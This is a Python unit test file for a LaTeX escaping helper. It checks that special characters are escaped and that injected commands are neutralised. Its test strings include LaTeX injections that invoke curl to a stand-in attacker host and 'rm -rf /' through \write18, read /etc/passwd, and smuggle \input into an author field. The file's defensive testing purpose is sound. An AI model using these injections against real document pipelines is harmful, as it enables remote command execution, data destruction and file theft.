from sutra.utils.latex import latex_escape

def test_latex_character_escaping():
    # Test typical LaTeX special characters
    payload = "A & B % C $ D # E _ F { G } H ~ I ^ J \\ K"
    escaped = latex_escape(payload)
    
    assert r"\&" in escaped
    assert r"\%" in escaped
    assert r"\$" in escaped
    assert r"\#" in escaped
    assert r"\_" in escaped
    assert r"\{" in escaped
    assert r"\}" in escaped
    assert r"\textasciitilde{}" in escaped
    assert r"\textasciicircum{}" in escaped
    assert r"\textbackslash{}" in escaped
    
    # Verify escaping doesn't break normal characters
    assert "A" in escaped
    assert "B" in escaped

def test_latex_command_neutralization():
    # Test malicious LaTeX injections
    assert "[neutralized command: input]" in latex_escape(r"\input{malicious.tex}")
    assert "[neutralized command: write]" in latex_escape(r"\write18{curl attacker.com}")
    assert "[neutralized command: include]" in latex_escape(r"\include{etc/passwd}")
    assert "[neutralized command: immediate]" in latex_escape(r"\immediate\write18{rm -rf /}")
    assert "[neutralized command: bibliography]" in latex_escape(r"\bibliography{secrets}")

def test_latex_nested_injection_protection():
    # Malicious author metadata trying to close an environment and execute commands
    injected_author = r"John Doe} \input{secret_file} \affiliation{Excellence"
    escaped = latex_escape(injected_author)
    
    # Assert closing brace is escaped and the command is neutralized
    assert r"\}" in escaped
    assert "[neutralized command: input]" in escaped
    assert r"\textbackslash{}" in escaped
